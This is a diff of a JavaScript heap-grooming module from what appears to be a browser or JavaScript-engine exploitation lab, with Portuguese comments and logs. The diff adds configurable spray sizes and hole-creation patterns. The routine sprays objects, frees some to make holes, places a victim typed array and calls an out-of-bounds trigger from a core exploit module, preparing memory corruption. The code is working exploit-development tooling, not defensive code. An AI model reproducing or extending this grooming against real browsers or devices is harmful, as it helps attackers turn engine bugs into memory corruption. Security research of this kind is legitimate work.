@@ -1,7 +1,7 @@
 // js/heap_groomer.mjs
 import { log as appLog, PAUSE_LAB } from './utils.mjs';
 import { updateOOBConfigFromUI, OOB_CONFIG } from './config.mjs';
-import * as Core from './core_exploit.mjs'; // Importa Core completo
+import * as Core from './core_exploit.mjs';
 
 export let victim_object = null;
 export let victim_object_type = 'TypedArray';
@@ -32,7 +32,7 @@ export async function prepareVictim(object_size_str) {
 
     try {
         victim_object = new Uint32Array(victim_typed_array_elements);
-        victim_object_type = 'Uint32Array'; // Define o tipo específico criado
+        victim_object_type = 'Uint32Array';
         for(let i=0; i < victim_object.length; i++) {
             victim_object[i] = (0xBB000000 | i) ;
         }
@@ -46,15 +46,15 @@ export async function prepareVictim(object_size_str) {
     }
 }
 
-export async function groomHeapExperimental(spray_count = 100, target_object_size = 288, intermediate_alloc_count = 20) {
+export async function groomHeapExperimental(spray_count, target_object_size, intermediate_alloc_count, spray_obj_size_override, hole_creation_pattern) {
     const FNAME_GROOM = `${FNAME_BASE_GROOMER}.groomHeapExperimental`;
     appLog(`--- Iniciando Heap Grooming Experimental ---`, "test", FNAME_GROOM);
-    appLog(`   Parâmetros Recebidos: spray_count=${spray_count}, target_object_size=${target_object_size}, intermediate_allocs=${intermediate_alloc_count}`, "info", FNAME_GROOM);
+    appLog(`   Parâmetros: spray_count=${spray_count}, target_obj_size=${target_object_size}, inter_allocs=${intermediate_alloc_count}, spray_obj_size_override=${spray_obj_size_override || 'N/A'}, hole_pattern=${hole_creation_pattern}`, "info", FNAME_GROOM);
     updateOOBConfigFromUI();
 
-    spray_array_temp = [];
+    spray_array_temp = []; // Limpa sprays anteriores para um novo estado
 
-    const spray_obj_size = target_object_size + 16;
+    const spray_obj_size = spray_obj_size_override > 0 ? spray_obj_size_override : target_object_size + 16; // Usa override ou default
     appLog(`   Fase 1: Spray com ${spray_count} objetos de ${spray_obj_size} bytes...`, "info", FNAME_GROOM);
     try {
         for (let i = 0; i < spray_count; i++) {
@@ -69,35 +69,53 @@ export async function groomHeapExperimental(spray_count = 100, target_object_siz
         appLog(`ERRO CRÍTICO durante Fase 1 (Spray): ${e.name} - ${e.message}. Abortando grooming.`, "error", FNAME_GROOM);
         console.error("Erro detalhado na Fase 1 (Spray):", e);
         spray_array_temp = [];
-        return; // Aborta o grooming se o spray falhar
+        return false; // Indica falha no grooming
     }
 
-    const num_holes_to_create = Math.floor(Math.min(spray_array_temp.length / 2, intermediate_alloc_count));
-    appLog(`   Fase 2: Tentando criar ${num_holes_to_create} buracos (desalocando objetos de spray)...`, "info", FNAME_GROOM);
+    const num_holes_to_create = Math.min(Math.floor(spray_array_temp.length / (hole_creation_pattern === 'alternate_skip_one' ? 2 : 1)), intermediate_alloc_count);
+    appLog(`   Fase 2: Tentando criar ${num_holes_to_create} buracos (padrão: ${hole_creation_pattern})...`, "info", FNAME_GROOM);
     let holes_created_count = 0;
-    for (let i = 0; i < spray_array_temp.length && holes_created_count < num_holes_to_create; i += 2) {
-        spray_array_temp[i] = null;
-        holes_created_count++;
+    const temp_spray_for_holes = [...spray_array_temp]; // Copia para modificar
+    spray_array_temp = []; // Vai repopular com os que sobrarem
+
+    if (hole_creation_pattern === 'alternate_skip_one') {
+        for (let i = 0; i < temp_spray_for_holes.length; i++) {
+            if (i % 2 === 0 && holes_created_count < num_holes_to_create) { // Desaloca os pares (índice 0, 2, 4...)
+                temp_spray_for_holes[i] = null;
+                holes_created_count++;
+            } else {
+                spray_array_temp.push(temp_spray_for_holes[i]); // Mantém os ímpares
+            }
+        }
+    } else if (hole_creation_pattern === 'first_n') {
+        for (let i = 0; i < temp_spray_for_holes.length; i++) {
+            if (i < num_holes_to_create) {
+                temp_spray_for_holes[i] = null;
+                holes_created_count++;
+            } else {
+                spray_array_temp.push(temp_spray_for_holes[i]);
+            }
+        }
+    } // Adicionar mais padrões aqui (ex: 'last_n', 'block')
+    else { // Padrão default (alternate_skip_one) ou se desconhecido
+         for (let i = 0; i < temp_spray_for_holes.length; i++) {
+            if (i % 2 === 0 && holes_created_count < num_holes_to_create) {
+                temp_spray_for_holes[i] = null; holes_created_count++;
+            } else { spray_array_temp.push(temp_spray_for_holes[i]); }
+        }
     }
-    spray_array_temp = spray_array_temp.filter(item => item !== null);
-    appLog(`   Fase 2: ${holes_created_count} referências removidas. ${spray_array_temp.length} objetos de spray restantes.`, "info", FNAME_GROOM);
+    appLog(`   Fase 2: ${holes_created_count} referências removidas. ${spray_array_temp.length} objetos de spray restantes (mantidos em spray_array_temp).`, "info", FNAME_GROOM);
 
     appLog(`   Fase 3: Tentando alocar vítima e buffer OOB...`, "info", FNAME_GROOM);
-    
-    victim_object = null; // Limpa a referência global à vítima antes de realocar
-
-    // Chama a função de limpeza do core_exploit.mjs
-    // Este é o ponto da linha 92 do seu erro.
+    victim_object = null;
     appLog("     Fase 3: Chamando Core.clearOOBEnvironment() para limpar o buffer OOB anterior...", "info", FNAME_GROOM);
     try {
-        Core.clearOOBEnvironment(); // <<< ALTERAÇÃO AQUI
+        Core.clearOOBEnvironment();
         appLog("     Fase 3: Core.clearOOBEnvironment() concluído.", "good", FNAME_GROOM);
     } catch (e_clear) {
          appLog(`     Fase 3: ERRO ao chamar Core.clearOOBEnvironment(): ${e_clear.name} - ${e_clear.message}`, "error", FNAME_GROOM);
          console.error("Erro detalhado na Fase 3, chamada a Core.clearOOBEnvironment:", e_clear);
-         // Decide se quer continuar mesmo se a limpeza falhar. Por agora, continua.
     }
-
 
     let victimPreparedSuccessfully = false;
     let oobConfiguredSuccessfully = false;
@@ -118,7 +136,7 @@ export async function groomHeapExperimental(spray_count = 100, target_object_siz
     appLog("     Fase 3: Chamando Core.triggerOOB_primitive...", "info", FNAME_GROOM);
     try {
         await Core.triggerOOB_primitive();
-        if (Core.oob_array_buffer_real) { // Verifica se foi realmente criado
+        if (Core.oob_array_buffer_real) {
             oobConfiguredSuccessfully = true;
             appLog(`     Fase 3: Core.triggerOOB_primitive aparentemente concluído com sucesso (buffer OOB existe).`, 'good', FNAME_GROOM);
         } else {
@@ -131,10 +149,12 @@ export async function groomHeapExperimental(spray_count = 100, target_object_siz
 
     if (victimPreparedSuccessfully && oobConfiguredSuccessfully) {
         appLog(`--- Heap Grooming Experimental Concluído (Fase 3 OK) ---`, "good", FNAME_GROOM);
+        appLog(`   Verifique o log e tente usar o VictimFinder ou o VictimCorruptor agora.`, "info", FNAME_GROOM);
+        return true;
     } else {
         appLog(`--- Heap Grooming Experimental Concluído com PROBLEMAS na Fase 3 (Vítima preparada: ${victimPreparedSuccessfully}, OOB configurado: ${oobConfiguredSuccessfully}) ---`, "warn", FNAME_GROOM);
+        return false;
     }
-    appLog(`   Verifique o log e tente usar o VictimFinder ou o VictimCorruptor agora.`, "info", FNAME_GROOM);
 }
 
 export async function groomHeapButtonHandler() {
@@ -144,46 +164,66 @@ export async function groomHeapButtonHandler() {
     const sprayCountEl = document.getElementById('groomSprayCount');
     const targetSizeEl = document.getElementById('groomTargetObjectSize');
     const interAllocsEl = document.getElementById('groomIntermediateAllocs');
+    const sprayObjSizeEl = document.getElementById('groomSprayObjSize'); // Novo input
+    const holePatternEl = document.getElementById('groomHolePattern'); // Novo select
 
     let spray_count = 200;
     let target_object_size;
     let intermediate_alloc_count = 50;
+    let spray_obj_size_override = 0; // 0 ou inválido significa usar default (target_object_size + 16)
+    let hole_creation_pattern = 'alternate_skip_one';
 
     if (sprayCountEl && sprayCountEl.value.trim() !== "") {
         const val = parseInt(sprayCountEl.value, 10);
         if (!isNaN(val) && val > 0) spray_count = val;
         else appLog(`Valor de Contagem de Spray '${sprayCountEl.value}' inválido. Usando padrão: ${spray_count}`, "warn", FNAME_HANDLER);
-    } else {
-        appLog(`Contagem de Spray não especificada. Usando padrão: ${spray_count}`, "info", FNAME_HANDLER);
-    }
+    } else { appLog(`Contagem de Spray não especificada. Usando padrão: ${spray_count}`, "info", FNAME_HANDLER); }
 
-    updateOOBConfigFromUI();
+    updateOOBConfigFromUI(); // Garante que OOB_CONFIG está atualizado para fallback
 
     if (targetSizeEl && targetSizeEl.value.trim() !== "") {
         const val = parseInt(targetSizeEl.value, 10);
-        if (!isNaN(val) && val > 0) {
-            target_object_size = val;
-        } else {
-            appLog(`Tamanho do Objeto Alvo para grooming '${targetSizeEl.value}' inválido. Usando OOB_CONFIG.ALLOCATION_SIZE: ${OOB_CONFIG.ALLOCATION_SIZE}`, "warn", FNAME_HANDLER);
+        if (!isNaN(val) && val > 0) { target_object_size = val; }
+        else {
+            appLog(`Tam. Obj. Alvo Grooming '${targetSizeEl.value}' inválido. Usando OOB_CONFIG.ALLOCATION_SIZE: ${OOB_CONFIG.ALLOCATION_SIZE}`, "warn", FNAME_HANDLER);
             target_object_size = OOB_CONFIG.ALLOCATION_SIZE;
         }
     } else {
         target_object_size = OOB_CONFIG.ALLOCATION_SIZE;
-        appLog(`Tamanho do Objeto Alvo para grooming não especificado. Usando OOB_CONFIG.ALLOCATION_SIZE: ${target_object_size}`, "info", FNAME_HANDLER);
+        appLog(`Tam. Obj. Alvo Grooming não especificado. Usando OOB_CONFIG.ALLOCATION_SIZE: ${target_object_size}`, "info", FNAME_HANDLER);
     }
     if (target_object_size <= 0) {
-        target_object_size = 288;
-        appLog(`Tamanho do Objeto Alvo para grooming resultou em <=0. Usando fallback seguro: ${target_object_size}`, "warn", FNAME_HANDLER);
+        target_object_size = 288; // Fallback final
+        appLog(`Tam. Obj. Alvo Grooming resultou em <=0. Usando fallback seguro: ${target_object_size}`, "warn", FNAME_HANDLER);
     }
 
     if (interAllocsEl && interAllocsEl.value.trim() !== "") {
         const val = parseInt(interAllocsEl.value, 10);
         if (!isNaN(val) && val >= 0) intermediate_alloc_count = val;
-        else appLog(`Valor de Alocações Intermediárias '${interAllocsEl.value}' inválido. Usando padrão: ${intermediate_alloc_count}`, "warn", FNAME_HANDLER);
-    } else {
-        appLog(`Alocações Intermediárias não especificadas. Usando padrão: ${intermediate_alloc_count}`, "info", FNAME_HANDLER);
-    }
+        else appLog(`Valor de Alocações Interm. '${interAllocsEl.value}' inválido. Usando padrão: ${intermediate_alloc_count}`, "warn", FNAME_HANDLER);
+    } else { appLog(`Alocações Interm. não especificada. Usando padrão: ${intermediate_alloc_count}`, "info", FNAME_HANDLER); }
 
-    appLog(`Parâmetros para groomHeapExperimental: spray=${spray_count}, target_size=${target_object_size}, inter_allocs=${intermediate_alloc_count}`, "info", FNAME_HANDLER);
-    await groomHeapExperimental(spray_count, target_object_size, intermediate_alloc_count);
+    if (sprayObjSizeEl && sprayObjSizeEl.value.trim() !== "") {
+        const val = parseInt(sprayObjSizeEl.value, 10);
+        if (!isNaN(val) && val > 0) spray_obj_size_override = val;
+        else appLog(`Tam. Obj. Spray Override '${sprayObjSizeEl.value}' inválido. Usando default derivado de target_object_size.`, "warn", FNAME_HANDLER);
+    } else { appLog(`Tam. Obj. Spray Override não especificado. Usando default.`, "info", FNAME_HANDLER); }
+    
+    if (holePatternEl) hole_creation_pattern = holePatternEl.value;
+
+    appLog(`Parâmetros para groomHeapExperimental: spray=${spray_count}, target_size=${target_object_size}, inter_allocs=${intermediate_alloc_count}, spray_override_size=${spray_obj_size_override || 'N/A'}, hole_pattern=${hole_creation_pattern}`, "info", FNAME_HANDLER);
+    
+    const btn = document.getElementById('btnRunGroomingExperimental');
+    if(btn) btn.disabled = true;
+    await groomHeapExperimental(spray_count, target_object_size, intermediate_alloc_count, spray_obj_size_override, hole_creation_pattern);
+    if(btn) btn.disabled = false;
+}
+
+export function clearSprayArrayButtonHandler() {
+    const FNAME_CLEAR_SPRAY = `${FNAME_BASE_GROOMER}.clearSpray`;
+    appLog(`Limpando spray_array_temp (tinha ${spray_array_temp.length} objetos)...`, "info", FNAME_CLEAR_SPRAY);
+    spray_array_temp = [];
+    // Forçar GC (não garantido, mas uma tentativa)
+    // if (typeof gc === 'function') { gc(); appLog("gc() chamado.", "info", FNAME_CLEAR_SPRAY); }
+    appLog(`spray_array_temp limpo.`, "good", FNAME_CLEAR_SPRAY);
 }
